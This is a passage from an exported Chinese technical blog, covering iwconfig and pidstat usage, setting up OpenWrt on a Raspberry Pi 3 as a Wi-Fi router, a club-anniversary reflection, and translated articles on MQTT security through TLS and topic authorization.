注意：如果是Managed模式，AP会指示无线网卡的工作频率，因此该设置的参数会被忽略。Ad-hoc模式下只使用该设定的频率初始无线网络，如果加入已经存在的Ad-hoc网络则会忽略该设置的频率参数。 1234$ iwconfig wlan0 freq 2422000000$ iwconfig wlan0 freq 2.422G$ iwconfig wlan0 channel 3$ iwconfig wlan0 channel auto rate/bit 如果无线网卡支持多速率，则可以通过该命令设置工作的速率。小于1000的参数由具体的无线网卡驱动定义，一般是传输速率的索引值，大于1000的为速率，单位bps，可以在数字后面附带k,M,G来指定数量级。auto参数让无线网卡自动选择速率fixed参数让无线网卡不使用自动速率模式。 123iwconfig wlan0 rate 11Miwconfig wlan0 rate autoiwconfig wlan0 rate 5.5M auto ap 连接到指定的AP或者无线网络，后面的参数可以是AP的MAC地址，也可以是iwlist scan出来的标识符。如果是Ad-hoc，则连接一个已经存在的Ad-hoc网络。使用off参数让无线网卡不改变当前已连接的AP下进入自动模式。any/auto参数，无线网卡自动选择最好的AP。 注意：如果无线信号低到一定程度，无线网络会进入自动选择AP模式。 123iwconfig wlan0 ap 00:60:1D:01:23:45iwconfig wlan0 ap anyiwconfig wlan0 ap off key/enc 设置无线网卡使用的加密密钥，此处为设置WEP模式的加密key，如果要使用WPA，需要wpa_supplicant工具包。 123iwconfig wlan0 key 0123-4567-89iwconfig wlan0 key [3] 0123-4567-89iwconfig wlan0 key s:password [2] power 设置无线网卡的电源管理模式。period ‘value’ 指定唤醒的周期，timeout ‘value’指定进入休眠的等待时间，这两个参数之前可以加min和max修饰，这些值的单位为秒，可以附加m和u来指定毫秒和微秒。off/on参数指定是否允许电源管理，all/unicast/multicast 指定允许唤醒的数据包类型。 123456iwconfig wlan0 power period 2iwconfig wlan0 power 500m unicastiwconfig wlan0 power timeout 300u alliwconfig wlan0 power saving 3iwconfig wlan0 power offiwconfig wlan0 power min period 2 power max period 4 txpower 如果无线网卡支持多发射功率设定，则使用该参数设定发射，单位为dBm，如果指定为W（毫瓦），只转换公式为：dBm=30+log(W)。参数on/off可以打开和关闭发射单元，auto和fixed指定无线是否自动选择发射功率。 1234$ iwconfig wlan0 txpower 15$ iwconfig wlan0 txpower 30mW$ iwconfig wlan0 txpower auto$ iwconfig wlan0 txpower off retry 设置无线网卡的重传机制。limit ‘value’ 指定最大重传次数；lifetime ‘value’指定最长重试时间，单位为秒，可以附带m和u来指定单位为毫秒和微秒。如果无线网卡支持自动模式，则在limit和lifetime之前还可以附加min和max来指定上下限值。 1234$ iwconfig wlan0 retry 16$ iwconfig wlan0 retry lifetime 300m$ iwconfig wlan0 retry short 12$ iwconfig wlan0 retry min limit 8 commit 提交所有的参数修改给无线网卡驱动。有些无线网卡驱动会先缓存无线网卡参数修，使用这个命令来让无线网卡的参数修改生效。不过一般不需要使用该命令，因为无线网卡驱动最终都会是参数的修改生效，一般在debug时会用到。 其他配置123456- nwid: Network ID # 只用于pre-802.11的无线网卡，802.11网卡利用ESSID和AP的MAC地址来替换nwid，现在基本上不用设置。- nick: Nickname # 一些网卡需要设置该参数，但是802.11协议栈、MAC都没有用到该参数，一般也不用设置。- sens # 设置接收灵敏度的下限，在该下限之下，无线网卡认为该无线网络信号太差。- rts # 设置节点发送RTS的最小包的大小- frag # 设置发送数据包的分片大小。- modu # 设定的特定调制集]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>iwconfig</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电协三周年分享]]></title>
    <url>%2F2017%2F11%2F11%2F%E7%94%B5%E5%8D%8F%E4%B8%89%E5%91%A8%E5%B9%B4%E5%88%86%E4%BA%AB%2F</url>
    <content type="text"><![CDATA[电子协会三周年系列专访，我的一些感想与思考，谨以此纪念电协三周年！ 忆往昔峥嵘岁月 电协三周年，很多的感慨。三年一晃而过，还记得第一届成立大会的情景，当初稚嫩的我们如今都已经毕业。从跟着12级的学长学姐学习，到我们第二届接手电子协会与实验室，再到把接力棒交给第三届，看着现在第四届朝气蓬勃的样子，我是由衷地为协会和实验室的发展感到高兴。 一年又一年，一届带一届，最重要的是精神的传承。可能每个人对这种精神的定义会不一样，但是这几年，我看到的电协人的精神是团结、互助、拼搏与创新。这是一个有活力的团队，在这里，几位优秀的指导老师带领一届届电协人一起学技术、做项目、搞创新，取得了优异的成绩。 这也是一个友爱的团队，在这里，收获的不仅仅是技术的进步与自身素质的提升，更重要的是结识了一群志同道合的朋友。虽然一起奋斗的那些日子已经一去不复返，但是我们依然铭记。当国庆期间，受邀到到深圳广州游玩，实验室几位老铁毕业以后的第一次相约。再次相聚，我们还是老样子，有说有笑，一起聊技术聊生活，一起开黑，这样真的很棒。 看今朝共铸辉煌 很荣幸这次能够和学弟一起策划这么一个系列专访，目的也是让小伙伴们对协会和实验室有更深入的了解，也希望学长学姐的一些分享能给大家带来帮助。前面的推送中，学长学姐已经给大家分享了很多使用的经验，不管是刚刚加入协会和实验室的学弟学妹，还是已经在准备找工作、考研的同学，我觉得都应该好好看看他们的经验分享，可以让你少走一些弯路。既然是系列专访，作为协会和实验室的老腊肉，那我也来分享一点自己的经验吧。 学习目标 大学，最怕没有目标。可以看到大学很多人都很迷茫，不知道前进的方向。如果你迷茫，可以与往届的学长学姐多聊聊，他们或许能够给你一些建议。当然，最关键的还是自己要去寻找目标，多去尝试，多去了解，只有这样你才知道自己以后想要做什么。当然，相信能够选择加入协会和实验室的人至少应该是有目标或者正在寻找目标的人。 学什么？协会和实验室已经有比较完善的学习体系，比如51单片机学习、PCB绘制等，这些都是必要的基础知识。除此之外，就我目前学习的经验以及我所了解的实验室的情况来看，建议大家可以学习一下嵌入式操作系统，比如嵌入式Linux、Contiki、RIOT或者华为的Lite-OS等。当然，还有著名的Linux，这是你们以后很有可能会接触到的。然后可以了解一下通信协议，比如6LoWPAN、ZigBee、NB-IoT等，这些也是做物联网相关项目的基础。另外，上次欧超学长回来提到的，大家不要总是拿着单片机闹钟、学生管理系统等这样的老掉牙的项目在做，我觉得也是很有道理的，大家在学完基础部分以后应该多了解一点新的技术，练习一些具有创新性、挑战性的项目。 学习方法 怎么学？好的学习方法往往能够使得你事半功倍。我们可以看到身边有少数同学，每天早出晚归，看似非常努力，但是效果却并不好。那如何取得更好的学习效果呢？谈一谈我认为比较重要的几点吧： 1. 广泛涉猎，善用工具。不要局限于某个很小的技术领域，而应该广泛涉猎相关的技术，其实，很多技术的都是相通的，很多思想可以互相借鉴。我在本科期间对嵌入式软件开发、安卓开发、Python编程、以及Web开发都有一定的了解，这些对我现在的研究都是很有帮助的。互联网时代，网上的工具和资源真是相当丰富了，多去CSDN、51CTO、华为等技术论坛，github等开源社区寻找你需要的工具。不要重复造轮子，多学习别人优秀的开源项目，从别人的项目中学习好的代码习惯，清晰的逻辑，高效的算法。开源在很大程度上推动着技术的进步，我们一方面可以充分利用开源项目进行学习与再创新，另一方面，也要学会分享，懂得分享，可以适当把自己的项目开源出去，让别人一起来改进。 2. 学会总结，善做笔记。做笔记其实是一个知识整理与总结的过程，当然，我说的做笔记不是一味地copy，最好的方式是用自己的话来表达。从我个人的习惯来说，我不仅使用像有道云笔记、evernote这样的工具做笔记，也时常把笔记整理后通过博客分享出去。个人认为，写博客就是一种很好的方式，不仅可以总结知识，分享知识，还可以广泛结交这个圈子里的人。技术博客不一定都是深奥的原理和技术分享，你自己学习中的一些知识点和问题的解决方法都可以记录成文章发表成博客。我是大二的时候开始写博客的，坚持了好几年，从CSDN到Wordpress再到现在的github pages，总计浏览量已达到十几万，这期间也通过博客结交了一群爱好技术的朋友，其中不乏名校的学生，也有出国留学的人。 3. 学会合作，注重交流。不要总是沉浸在自己的技术世界里面，多与别人合作，特别要注重交流，避免不必要的错误。一方面，一定要有自己的技术小团队，找几个志同道合，能够共同讨论交流，共同进步的人，平时遇到问题可以一起交流讨论，提升解决问题的效率。另一方面，尝试着通过留言、邮件等方式去与活跃于技术论坛的人交流，寻找学习与合作的机会。 行动力 最后就是靠个人的行动了，努力、坚持不懈这些词不是我应该对你们说的，而应该是你们自己去做的，如何去做到，相信你会有自己的方法。好了，巴拉巴拉说了很多了，目前只想到这些，如果有什么问题可以联系我。 另外，一个团结友爱的集体，不应该只有学习，还应该有酒有肉有故事。千万不要大学四年读完了都不知道长沙有哪些好玩的地方，有机会一起去市里浪一浪，别整天死宅死宅的，有机会也可以一起喝酒撸串，一起搞事情，一起谈人生谈理想。 望未来任重而道远 看到这几年协会与实验室的发展，每年都有很多优秀的人才，每年都能拿很多的奖励，估计所有的获奖证书连起来应该都可以绕实验室几圈了吧，哈哈哈~但是，我们应该始终保持危机感。从我了解的情况来看，学院其他协会和实验室都发展得很好，如何让电子协会和实验室取得更大的进步，面对技术的日新月异，如何抓住新机遇将实验室技术能力再提升一个档次等问题是我们都应该思考。 记得当初我做项目时使用的树莓派以及物联网云平台现在已经逐渐得到大家的认可，但是我觉得这个得到认可的周期太长了，大家应该更快的接受新的东西。就像我现在读研究生，导师都是要求我们通过一些顶级学术会议和期刊的论文来追踪学术热点，同样，大家所参加的一些开放式的竞赛也是这样，多看看别人在做什么项目，不要局限在自己的思维里，可能你觉得很好的一个想法，别人早就已经实现得很好了，所以你就不能单纯的实现别人已经实践过的项目，而应该在它的基础上思考还有什么可以改进的地方，实现再创新。总之，开阔眼界，广泛交流，这是我认为协会和实验室小伙伴可以努力的方向。 另外，有机会也可以邀请毕业的学长学姐回去分享经验，特别是在企业做嵌入式软件开发或者硬件开发的学长学姐，因为他们所做的东西更系统，更接近实际，也与大家以后的工作息息相关。希望协会和实验室能够让不同届的同学有更多沟通交流的机会，否则也就只有相近的两三届有联系了。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux进程实时监控：pidstat]]></title>
    <url>%2F2017%2F10%2F26%2FLinux%E8%BF%9B%E7%A8%8B%E5%AE%9E%E6%97%B6%E7%9B%91%E6%8E%A7%EF%BC%9Apidstat%2F</url>
    <content type="text"><![CDATA[pidstat主要用于监控全部或指定进程占用系统资源的情况，如CPU，内存、设备IO、任务切换、线程等。 pidstat安装 要使用pidstat需要安装Sysstat，它是一个工具集，包括sar、pidstat、iostat、mpstat、sadf、sadc。 1$ sudo apt-get install sysstat pidstat首次运行时显示自系统启动开始的各项统计信息，之后运行pidstat将显示自上次运行该命令以后的统计信息。用户可以通过指定统计的次数和时间来获得所需的统计信息。 基本命令 用户手册：http://sebastien.godard.pagesperso-orange.fr/man_pidstat.html 12345Usage: pidstat [ options ] [ &lt;interval&gt; [ &lt;count&gt; ] ]Options are:[ -d ] [ -h ] [ -I ] [ -l ] [ -R ] [ -r ] [ -s ] [ -t ] [ -U [ &lt;username&gt; ] ][ -u ] [ -V ] [ -v ] [ -w ] [ -C &lt;command&gt; ] [ -G &lt;process_name&gt; ][ -p &#123; &lt;pid&gt; [,...] | SELF | ALL &#125; ] [ -T &#123; TASK | CHILD | ALL &#125; ] 指定采样周期和采样次数 pidstat命令指定采样周期和采样次数，例如以2秒为采样周期，输出10次cpu使用统计信息： 1$ pidstat 2 10 -p参数1-p &#123; pid [,...] | SELF | ALL &#125; #指定进程显示其报告 选择要报告统计信息的任务（进程）。pid是进程标识号。 SELF关键字表示要为pidstat进程本身报告统计信息，而ALL关键字表示要为系统管理的所有任务报告统计信息。SELF和ALL可不指定，如下： 1$ pidstat -p 进程号 可使用以下命令获得进程号，以下命令会列出所有进程的进程号： 1$ ps -e 也可以通过top命令或者直接查看某个服务的状态得到该服务涉及的进程。 -u参数 使用-u选项，pidstat将显示各活动进程的cpu使用统计，执行”pidstat -u”与单独执行”pidstat”的效果一样。 123$ pidstator$ pidstat -u 123456789- UID # 正在监视的任务的真实用户识别号- USER # 正在监视的任务的真实用户名- PID # 被监视任务的识别号- %usr # 在用户级（应用程序）执行任务时使用的CPU的百分比，有或没有优先级。请注意，此字段不包括运行虚拟处理器的时间- %system # 在系统级别（内核）执行任务时CPU占用的百分比- %guest # 虚拟机中任务占用的CPU的百分比（运行虚拟处理器）- %CPU # 该任务使用的CPU时间的总百分比- CPU # 处理器号，任务被哪个处理器处理- Command # 任务的命令名 -r参数 使用-u选项，pidstat将显示各活动进程的页面故障和内存利用率。 1$ pidstat -r 123456789- UID # 正在监视的任务的真实用户识别号- USER # 正在监视的任务的真实用户名- PID # 被监视任务的识别号- minflt/s # 每秒次缺页错误次数(minor page faults)，次缺页错误次数意即虚拟内存地址映射成物理内存地址产生的page fault次数- majflt/s # 每秒主缺页错误次数(major page faults)，当虚拟内存地址映射成物理内存地址时，相应的page在swap中，这样的page fault为major page fault，一般在内存使用紧张时产生- VSZ # 该进程使用的虚拟内存(以kB为单位)- RSS # 该进程使用的物理内存(以kB为单位)- %MEM # 当前任务使用的有效内存的百分比- Command # 任务的命令名 -d参数 使用-d选项，pidstat将将显示各活动进程的I/O统计信息（内核2.6.20及更高版本）。 1$ pidstat -d 12345678- UID # 正在监视的任务的真实用户识别号- USER # 正在监视的任务的真实用户名- PID # 被监视任务的识别号- kB_rd/s # 每秒此进程从磁盘读取的千字节数- kB_wr/s # 此进程已经或者将要写入磁盘的每秒千字节数- kB_ccwr/s # 由任务取消的写入磁盘的千字节数- iodelay # 阻止正在监视的任务的I/O延迟，以时钟滴答测量- Command # 命令的名字 其他参数1234567-h # 显示所有的活动的任务-I # 在SMP环境，指出任务的CPU使用（等同于选项-u）应该被除于cpu的总数-l # 显示进程的命令名和它的参数-T &#123; TASK | CHILD | ALL &#125; # 指定必须监测的内容：TASK是默认的，单个任务的报告；CHILD：指定的进程和他们的子进程的全局报告，ALL：相当于TASK和CHILD-s # 堆栈的使用-t # 显示与所选任务相关的线程的统计数据-w # 报告任务切换情况 使用示例 以2秒为采样周期，输出5次进程号为1643的页面故障和内存使用统计信息。 1pidstat -r -p 1643 2 5 以2秒为采样周期，输出5次进程号为1643的页面故障和内存使用统计信息以及CPU使用率。 1pidstat -u -r -p 1643 2 10 以2秒为采样周期，输出10次系统中所有任务的子进程的页面错误统计信息。只显示具有非零统计值的子进程。 1pidstat -T CHILD -r 2 10 保存数据 重定向输出即可，例如，每隔两秒记录1次，一共10次，并输出到data.txt文件 1$ pidstat 2 10 &gt; data.txt]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>pidstat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Raspberry pi 3刷OpenWrt打造无线路由器]]></title>
    <url>%2F2017%2F10%2F18%2FRaspberry-pi-3%E5%88%B7OpenWrt%E6%89%93%E9%80%A0%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[OpenWrt在Raspberry pi 3上的安装与初步配置记录。 烧写Openwrt系统 下载支持Raspberry Pi 3代的LEDE（Openwrt的一个分支）镜像， LEDE官方网站：https://lede-project.org/ Raspbery Pi 3 LEDE镜像下载地址：http://downloads.lede-project.org/snapshots/targets/brcm2708/bcm2710/lede-brcm2708-bcm2710-rpi-3-ext4-sdcard.img.gz 使用Win32DiskImager工具将下载的镜像文件写入到SD卡中，然后连接显示器键盘即可进入系统进行相关操作。 Raspbery Pi 3连接显示器后无显示的问题： 修改系统/boot/comfig.txt文件，默认的HDMI输出都配置为不开启，所以需要配置HDMI输出为如下： 123456789hdmi_safe=1overscan_left=-30overscan_right=-30overscan_top=-30overscan_bottom=-30hdmi_group=2hdmi_mode=4hdmi_drive=2config_hdmi_boost=4 配置Openwrt 配置Openwrt有线网络，修改/etc/config/network文件，配置wan口和lan口如下： 1234567891011config interface &apos;lan&apos; option type &apos;bridge&apos; option proto &apos;static&apos; option ipaddr &apos;192.168.3.1&apos; option netmask &apos;255.255.255.0&apos; option ip6assign &apos;60&apos; option gateway &apos;192.168.3.1&apos;config interface &apos;wan&apos; option proto &apos;dhcp&apos; option ifname &apos;eth0&apos; 配置Openwrt无线网络，修改/etc/config/wireless文件，配置wlan0的模式、ssid、key等信息，如下： 1234567config wifi-iface option device &apos;radio0&apos; option network &apos;lan&apos; option mode &apos;ap&apos; option ssid &apos;openwrt-fzy&apos; option encryption &apos;psk2&apos; option key &apos;12345678&apos; 配置允许通过wan连接ssh，修改/etc/config/firewall文件： 123456#open ssh on wan interfaceconfig rule option src wan option dest_port 22 option target ACCEPT option proto 重启Raspberry Pi，网线连接路由器dhcp获取ip，笔记本用wifi连接Raspberry Pi。 安装luci界面，可以通过浏览器访问路由。 1234opkg updateopkg install luci/etc/init.d/uhttpd start/etc/init.d/uhttpd enable 配置完成后可通过连接到该无线网络的设备访问192.168.3.1进入到路由器的Web配置界面。 至此，Raspberry Pi作为路由器部分已经完成，后续还可以将其配置成Wi-Fi抓包器。]]></content>
      <categories>
        <category>Raspberry Pi</category>
      </categories>
      <tags>
        <tag>［树莓派,OpenWrt］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]MQTT安全基础：TLS/SSL]]></title>
    <url>%2F2017%2F10%2F10%2F%E8%AF%91-MQTT%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%EF%BC%9ATLS-SSL%2F</url>
    <content type="text"><![CDATA[欢迎来到MQTT安全基础系列的第五部分。在最近几周的文章中关注了应用层的身份验证和授权后，本周的主题是使用TLS的传输加密。 我们将看看为什么TLS / SSL对于安全的MQTT解决方案是有利的，我们将讨论使用MQTT传输加密时的最佳做法。 注：本文翻译自：MQTT Security Fundamentals: TLS / SSL 什么是TLS TLS（传输层安全）和SSL（安全套接字层）在客户端和服务器之间提供安全的通信通道。其核心是TLS和SSL是使用握手机制协商各种参数以在客户端和服务器之间建立安全连接的加密协议。握手完成后，建立客户端与服务器之间的加密通信，没有攻击者可以窃听通信的任何部分。服务器提供X509证书，通常由受信任的机构颁发，客户端用它来验证服务器的身份。 为什么TLS很重要？ 想像你正在发送明信片。很明显，该卡的收件人是谁，邮递员将确保该卡到达。然而，没有什么可以阻止邮递人员读卡的内容，实际上涉及交付明信片的每个人都可以阅读内容。如果你有一个恶意的邮递员，他甚至可以改变明信片中的一些内容！ 以上说明的情况对于一般的计算机网络和特别是互联网也是如此。如果你使用纯TCP/IP，就像发送明信片。 TCP数据包将在达到目标之前经过大量基础架构组件（路由器，防火墙，Internet交换点等）。所有参与者之间现在可以以明文形式读取您的数据包的内容，甚至可以修改它。这不是一个虚构的场景，最近的历史表明，互联网流量一直被情报机构窃听。虽然大多数攻击者没有太多的资源来窃听你的连接，但复杂的攻击者并不是太难以执行“中间人攻击”。 所以TLS就是提供一个安全的通信信道。使用TLS，可以肯定的是，第三方不能读取或更改通信内容*。 假设使用安全的密码套件，并且对所使用的TLS版本没有未知的攻击。 MQTT与TLS MQTT依赖于TCP作为传输协议，这意味着默认情况下连接不使用加密通信。为了加密整个MQTT通信，大多数MQTT代理（如HiveMQ）允许使用TLS而不是纯TCP。如果使用MQTT CONNECT数据包的用户名和密码字段进行身份验证和授权机制，则应强烈考虑使用TLS。 端口8883对于安全的MQTT连接是标准化的。IANA的标准化名称是“secure-mqtt”，端口8883专用于基于TLS的MQTT。 TLS开销 然而，一如以往，在使用基于TLS的MQTT时存在一个缺点：安全性在CPU使用率和通信开销方面是有代价的。虽然代理的附加CPU使用率通常可以忽略不计，但对于非专门针对计算密集型任务而设计的非常受限的设备来说，这可能是一个问题。诸如Session Resumption之类的技术可以大大提高TLS的性能。 如果MQTT客户端连接预期是短暂的，则TLS握手的通信开销可能很大。虽然这取决于许多因素，TLS握手需要多少带宽，但一些测量显示，建立新的TLS连接可能需要高达几千字节的带宽。由于每个数据包在使用TLS时都被加密，与未加密的数据包相比，电线上的数据包也有额外的开销。 因此，如果你使用长存TCP连接与MQTT（你应该！），TLS开销，特别是TLS握手开销可能是微不足道的。如果您正在处理许多重新连接，并且无法使用会话恢复，那么开销可能很大，特别是如果您发布非常小的MQTT消息。如果电线上的每个字节对您的用例计数，则由于开销，TLS可能不是你的最佳选择，因此请务必测量TLS用于你的用例的开销。 会话恢复 我们已经听说过以前段落中的TLS会议恢复。简而言之，TLS会话恢复技术允许在重新连接到服务器之后重用已经协商的TLS会话，因此客户端和服务器不需要再次完成TLS握手。重要的是要注意，并不是所有的TLS库实现了所有会话恢复技术，有些甚至没有实现任何会话恢复机制。 有两个会话恢复机制： Session IDs：服务器将秘密状态与会话ID一起存储。当客户端重新连接时，它提供会话ID，可以恢复会话。 Session Tickets：服务器的秘密状态被发送到客户端，并且仅使用服务器知道的秘密密钥进行加密。重新连接时，客户端将此故障单发送回服务器。如果服务器可以再次对内容进行解密，会话将恢复为机密中包含的状态。 HiveMQ支持Session IDs，但不支持Session Tickets。 受限设备上的TLS 由于资源不足，有时TLS对于受限设备是不可行的。根据使用的密码，TLS可能非常计算密集，可能需要几十千字节的内存。如果您的设备无法使用TLS，则应考虑为PUBLISH消息使用有效负载加密，并且至少应在客户端的CONNECT消息中对密码进行散列或加密。更多关于该主题的下一篇博客文章。 它也可以是查看TLS-PSK密码套件的选项，因为它们避免了CPU密集型公钥操作。TLS-PSK密码尚未被广泛采用，因此您需要重新检查TLS库是否支持此功能。 我应该总是使用TLS与MQTT？ Short answer：是的，如果可以的话。 Long answer：如果您能够负担CPU和带宽的开销，那么安全的通信通道是无价的。如果在客户端和服务器端正确实施TLS，则确保没有窃听者可以拦截您的通信，并获得对应用程序级身份验证和授权很重要的附加安全层。 最佳做法如果可以的话，始终使用TLS 如果您能负担额外的带宽并且您的客户端具有足够的计算能力和TLS内存，那么始终使用TLS与MQTT。根据经验，总是使用加密的通信通道，也可以用于HTTP等其他协议。 使用最高可用的TLS版本 虽然TLS 1.0，TLS 1.1和TLS 1.2在实践中至少不会破坏（至少到现在为止），但您应该始终使用对您的MQTT客户端可行的最高TLS版本。事实上，对TLS 1.0和1.1有着众所周知的攻击，可以缓解这些攻击，有些则针对HTTP漏洞（如CRIME攻击）而设计。在撰写本文时，没有实际适用的攻击TLS 1.2。 不要使用SSLv3 不要使用SSLv3或任何以前的版本。POODLE攻击显示，SSLv3现在必须被视为破损坏。所有其他SSL版本也被认为是破坏的，不应该被使用。 始终验证X509证书链 为了防止中间人攻击，您的MQTT客户端验证来自MQTT代理的X509证书是非常重要的。一些恶意的客户端实现使用“允许全部”方法，通常与自签名服务器证书组合。永远不要这样做！做更多安全和验证证书总是值得的。 使用受信任CA的证书 使用受信任的CA的官方证书值得他们花费的额外费用，因为自签名的证书在许多TLS实现方面不能太好地运行，并且通常会导致例如错误的代码。不验证证书，造成中间人攻击的可能性。如果您的MQTT代理面向公开，则必须具有受信任的证书。如果您通过Websockets使用MQTT，则自签名证书不是最佳的，因为大多数现代Web浏览器不允许使用不受信任的证书进行websocket连接资源。 使用其他安全机制 除了TLS之外，使用额外的安全机制（如有效负载加密，有效载荷签名验证和授权机制）总是一个好主意。更安全的考虑通常不会有伤害。 只使用安全密码套件 使用TLS时可以使用许多不安全的密码套件。确保只允许安全的密码套件进行通信，否则可能会产生错误的安全感，因为有许多已知被破坏的密码套件。 我们希望您喜欢第五部分MQTT安全基础知识。下周我们将与TLS一起讨论X509客户端证书身份验证。]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]MQTT安全基础：授权]]></title>
    <url>%2F2017%2F09%2F28%2F%E8%AF%91-MQTT%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%EF%BC%9A%E6%8E%88%E6%9D%83%2F</url>
    <content type="text"><![CDATA[您好，欢迎来到MQTT安全基础的下一篇文章。本周，我们将专注于一个新课题，并通过MQTT研究授权。这在我们以前讨论过认证后才适合。如果您没有阅读关于身份验证的最后两篇文章（第1部分和第2部分），那么在继续阅读此文章之前，您一定要这样做。 注：本文翻译自：MQTT Security Fundamentals: Authorization 什么是授权？ 授权是指定特定资源的访问权限的功能。这包括策略的定义和实施，它们指定谁可以访问某个资源。因此，以下术语至关重要： 主体或用户：想访问资源 资源，对象或服务：应防止未经授权的访问 政策：指定主体是否可以访问资源 真实世界例证 让我们来看一下身份验证博客文章的旅行示例，并继续执行。我们已经看到，登机时可以使用护照来认证一个人的身份。所以在身份确认后，预订确认书或登机证用于授权/授予访问权限以获得特定的飞机。所以在预订航班后，有关您的人的信息和确切的航班日期，时间和目的地作为飞行的授权。 认证和授权：两个最好的朋友！ 正如我们已经在现实世界中看到的那样，认证和授权是两个非常重要的安全概念。用户或主体的授权在事先没有认证的情况下没有太多价值，从而确认其身份。授权对于限制访问非常重要，只允许符合条件的人员，客户或主体访问某些资源，数据或事物。如果您没有特别关注安全性，您可能不会注意到这些概念无处不在，但如果您退缩并仔细查看，您可以轻松识别它们：登录到您的操作系统并访问文件，登录到网络应用程序，并具有某些权利或使用工作人员徽章访问公司大楼。 如何指定授权策略 最常用的是不同类型的授权，这里是一个快速的概述。如果你想了解更多，网络上有大量的资源可以详细地解释这些类型。 简写 名称 说明 示例 ACL 访问控制列表 ACL将资源与权限列表相关联。权限包括谁可以访问资源（例如文件）以及哪些操作（例如，读取，写入，执行）被允许。 Unix文件权限 RBAC 基于角色的访问控制 RBAC始终将某个资源的权限与角色相关联。角色是用户和资源之间的额外抽象。这使得更容易将用户与角色相关联，以便维护所有用户的权限。 Active Directory, SELinux, PostgreSQL MQTT授权 我们来看看MQTT。 MQTT客户端在连接到代理之后基本上可以做两件事情，它可以发布消息，并且可以订阅主题。所以将其转换为以前所述的定义： 一个MQTT客户端是主题，它需要授权才能做某事 客户可用的主要资源或对象是主题 其他对象将是：Store Last Will and Testament或持久会话 需要保护的主要资源是发布或订阅的能力 没有适当的授权，每个经过身份验证的客户端都可以发布和订阅各种主题。这在封闭系统中是可取的。对于大多数用例，细粒度限制使得很有意义，应该被使用。官方的MQTT 3.1.1规范说明了以下事项： 123“MQTT solutions are often deployed in hostile communication environments. In such cases, implementations will often need to provide mechanisms for: […] Authorization of access to Server resources”“MQTT解决方案通常部署在恶劣的通信环境中。在这种情况下，实现通常需要提供以下机制：[...]访问服务器资源的授权&quot; 为了限制客户端发布或订阅仅被授权的主题，有必要在代理方实现主题权限。这些权限需要在代理运行时配置和调整。主题权限可以如下所示： 允许主题（确切主题或通配符主题） 允许的操作（发布，订阅，两者） 允许服务质量水平（0，1，2，全部） 这种主题权限将允许代理为客户端指定授权策略，并限制其订阅和发布消息的能力。一个例子是给客户端许可只订阅一个主题，只使用一定的服务质量水平。 拒绝 在定义了授权策略之后，一个很常见的问题是如何通知客户它没有发布或订阅某个主题的权限。 发布 当发布到主题时，客户端没有权限，代理有两个选项： 它可以断开客户端，因为发布到受限主题是不允许的。 它可以以普通方式向客户端发送（在使用PUBACK或PUBREL的QoS 1或2的情况下），并决定不向订阅者发送已发布的消息。 目前的MQTT 3.1.1规范没有定义与代理无关的方式来通知客户端未经授权的发布，除了断开客户端，这可能会在即将到来的MQTT版本中有所改进。 订阅 在订阅主题的情况下，代理需要使用返回码确认每个订阅。有4个不同的代码用于确认具有授权QoS的每个主题或发送错误代码。因此，如果客户端无权订阅特定主题，代理可以通知客户该订阅被拒绝。 最佳做法 常用的最佳做法是将许可中的发布客户端的客户端标识包含在内。所以客户端仅限于发布到主题，客户端ID在哪里。一个例子是client123/temperature或client123/＃。同样可以用于订阅。这是一个只关心一个客户端的主题的良好模式。当然，这通常不是唯一的许可。此外，客户端通常具有订阅更常规主题的权限，如：clients/status或clients/command。这很大程度上取决于用例，应该只是一个建议。 代理实现 最后，我们来看看HiveMQ MQTT代理如何实现自定义授权。 HiveMQ的开源插件系统可以轻松为每个客户端指定主题权限。每当客户端想要发布或订阅时，HiveMQ会向插件询问客户端的权限。当然这些权限可以被缓存，所以它不会减慢消息流。 OnAuthorizationCallback允许实现getPermissionsForClient方法，其示例如下所示。该方法从HiveMQ内核中调用，并交付一个ClientData对象，该对象包含可用于客户端请求权限的所有可用信息。这可以用来确定正确的权限，就像示例中使用客户端ID一样。HiveMQ期望插件返回客户端允许使用的主题权限列表。HiveMQ本身完成了权限和当前主题的完全匹配。 123456789101112@Override@Cached(timeToLive = 5, timeUnit = TimeUnit.MINUTES)public List&lt;MqttTopicPermission&gt; getPermissionsForClient(ClientData clientData) &#123; List&lt;MqttTopicPermission&gt; mqttTopicPermissions = new ArrayList&lt;MqttTopicPermission&gt;(); mqttTopicPermissions.add( new MqttTopicPermission( clientData.getClientId() + “/#”, // Topic MqttTopicPermission.ALLOWED_QOS.ALL, // QoS MqttTopicPermission.ALLOWED_ACTIVITY.ALL)); // Publish, Subscribe, All return mqttTopicPermissions;&#125; 该示例显示客户端如何只发布和订阅主题，从其客户端ID开始。所有其他订阅或发布的消息都被拒绝。 完整的示例可以在HiveMQ GitHub帐户中找到。 另一个例子是Stormpath插件，它使用Strompath API进行身份验证和授权。]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]MQTT安全基础：高级认证机制]]></title>
    <url>%2F2017%2F09%2F23%2F%E8%AF%91-MQTT%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%EF%BC%9A%E9%AB%98%E7%BA%A7%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%2F</url>
